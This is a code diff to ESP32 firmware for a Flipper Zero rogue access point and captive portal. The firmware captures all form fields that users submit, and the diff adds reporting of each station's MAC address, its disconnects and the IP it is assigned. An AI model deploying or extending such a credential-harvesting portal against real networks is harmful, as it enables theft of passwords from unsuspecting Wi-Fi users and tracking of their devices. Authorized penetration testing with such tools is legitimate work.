@@ -7,7 +7,9 @@
 //   start\n | stop\n | reset\n
 // ESP -> Flipper (line-oriented):
 //   STATUS <token>   (boot, html_ok, ap_ok, portal_up ip=..., stopped, resetting)
-//   HIT              (a station joined the AP)
+//   HIT mac=<mac>    (a station joined the AP)
+//   BYE mac=<mac>    (a station left the AP)
+//   IP mac=<mac> ip=<ip>   (DHCP assigned a station its IP)
 //   CRED <urlencoded>   (all submitted form fields, one line per submission)
 //
 // Authorized testing only.
@@ -16,6 +18,8 @@
 #include <AsyncTCP.h>
 #include <ESPAsyncWebServer.h>
 #include <DNSServer.h>
+#include <esp_wifi.h>
+#include <esp_netif.h>
 
 #define MAX_HTML_SIZE 48000
 #define MAX_SSID 32
@@ -105,13 +109,48 @@ public:
     }
 };
 
+static void formatMac(const uint8_t* m, char* out /* >=18 */) {
+    snprintf(
+        out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
+}
+
 static void onStaConnect(WiFiEvent_t event, WiFiEventInfo_t info) {
     (void)event;
-    const uint8_t* m = info.wifi_ap_staconnected.mac;
     char mac[18];
-    snprintf(
-        mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
-    emitLine(String("HIT mac=") + mac);
+    formatMac(info.wifi_ap_staconnected.mac, mac);
+    emitLine(String("HIT mac=") + mac); // a station joined the AP
+}
+
+static void onStaDisconnect(WiFiEvent_t event, WiFiEventInfo_t info) {
+    (void)event;
+    char mac[18];
+    formatMac(info.wifi_ap_stadisconnected.mac, mac);
+    emitLine(String("BYE mac=") + mac); // a station left the AP
+}
+
+// DHCP handed a station an IP. The event only carries the IP (no MAC on this
+// IDF), so look the MAC up in the soft-AP station table by matching the IP, and
+// report the pair so the Flipper can attach the IP to the right client. Falls
+// back to an IP-only line if the table lookup can't resolve it.
+static void onStaIp(WiFiEvent_t event, WiFiEventInfo_t info) {
+    (void)event;
+    uint32_t evip = info.wifi_ap_staipassigned.ip.addr;
+    IPAddress ip(evip);
+
+    wifi_sta_list_t wifi_list;
+    esp_netif_sta_list_t netif_list;
+    if(esp_wifi_ap_get_sta_list(&wifi_list) == ESP_OK &&
+       esp_netif_get_sta_list(&wifi_list, &netif_list) == ESP_OK) {
+        for(int i = 0; i < netif_list.num; i++) {
+            if(netif_list.sta[i].ip.addr == evip) {
+                char mac[18];
+                formatMac(netif_list.sta[i].mac, mac);
+                emitLine(String("IP mac=") + mac + " ip=" + ip.toString());
+                return;
+            }
+        }
+    }
+    emitLine(String("IP ip=") + ip.toString()); // MAC unknown; Flipper pairs by recency
 }
 
 static void startPortal() {
@@ -204,6 +243,8 @@ void setup() {
     delay(100);
     index_html_len = strlen(index_html);
     WiFi.onEvent(onStaConnect, ARDUINO_EVENT_WIFI_AP_STACONNECTED);
+    WiFi.onEvent(onStaDisconnect, ARDUINO_EVENT_WIFI_AP_STADISCONNECTED);
+    WiFi.onEvent(onStaIp, ARDUINO_EVENT_WIFI_AP_STAIPASSIGNED);
     lineBuf.reserve(210);
     emitLine("STATUS boot");
 }
